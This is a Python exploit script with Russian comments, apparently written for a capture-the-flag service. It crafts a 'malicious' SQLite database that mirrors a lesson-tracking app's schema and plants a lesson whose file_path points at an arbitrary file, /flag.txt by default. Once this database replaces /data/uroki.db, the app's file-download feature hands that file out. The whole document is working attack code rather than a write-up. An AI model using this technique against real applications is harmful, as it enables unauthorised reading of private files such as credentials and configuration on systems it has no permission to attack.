"""Крафт зловредной SQLite БД для подмены /data/uroki.db.

Схема повторяет оригинальную (app/db.py SCHEMA), но в строке урока
file_path указывает на файл, который хотим прочитать (/flag.txt).
"""
import os
import sqlite3
import sys

TARGET_FILE = sys.argv[1] if len(sys.argv) > 1 else "/flag.txt"
OUT = sys.argv[2] if len(sys.argv) > 2 else "/tmp/uroki_test/data/uploads/evil.db"

SCHEMA = """
CREATE TABLE IF NOT EXISTS lessons (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    title TEXT NOT NULL,
    subject TEXT NOT NULL,
    teacher TEXT NOT NULL,
    scheduled_at INTEGER NOT NULL,
    status TEXT NOT NULL DEFAULT 'planned',
    homework TEXT,
    file_name TEXT,
    file_path TEXT,
    created_at INTEGER NOT NULL
);

CREATE TABLE IF NOT EXISTS comments (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    lesson_id INTEGER NOT NULL,
    author TEXT NOT NULL,
    body TEXT NOT NULL,
    created_at INTEGER NOT NULL
);

CREATE INDEX IF NOT EXISTS idx_comments_lesson ON comments (lesson_id);
"""

if os.path.exists(OUT):
    os.remove(OUT)  # иначе sqlite откроет существующую базу и упадёт на UNIQUE

conn = sqlite3.connect(OUT)
try:
    conn.executescript(SCHEMA)
    conn.execute(
        "INSERT INTO lessons (id, title, subject, teacher, scheduled_at, status,"
        " homework, file_name, file_path, created_at)"
        " VALUES (1, 'flag', 'flag', 'flag', 0, 'planned', NULL, 'flag.txt', ?, 0)",
        (TARGET_FILE,),
    )
    # пара строк, чтобы все эндпоинты оставались живыми
    conn.execute(
        "INSERT INTO lessons (id, title, subject, teacher, scheduled_at, status,"
        " homework, file_name, file_path, created_at)"
        " VALUES (2, 'x', 'x', 'x', 1799999999, 'planned', NULL, NULL, NULL, 0)"
    )
    conn.commit()
finally:
    conn.close()

print("crafted:", OUT, "->", TARGET_FILE)
